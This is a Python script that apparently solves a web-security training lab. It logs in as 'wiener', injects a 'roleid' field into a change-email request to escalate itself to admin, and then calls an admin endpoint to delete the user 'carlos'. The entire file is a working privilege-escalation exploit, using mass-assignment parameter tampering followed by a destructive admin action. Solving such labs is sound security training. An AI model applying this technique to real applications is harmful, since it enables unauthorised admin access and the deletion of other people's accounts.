#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code == 302:
        return True
    return False

def change_roleid(s, url):
    print("[*] Changing roleid from 1 to 2...")
    change_url = url + "/my-account/change-email"
    data = {"username": "wiener", "email": "test@test.com", "apikey": "v7K5XVE0BBcbDZvp8MgqtdGNQzn6cjDN", "roleid": 2 }
    r = s.post(change_url, json=data, verify=False,allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code == 302:
        return True
    return False

def delete_carlos(s, url):
    print("[*] Deleting carlos...")
    r = s.get(url + "/admin/delete?username=carlos", verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Carlos deleted - Lab solved")
        return True
    print("[-] Failed to delete carlos")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    if not change_roleid(s, url):
        print("[-] Failed to change roleid")
        return
    print("[+] Role changed to admin")
    delete_carlos(s, url)

if __name__ == "__main__":
    main()    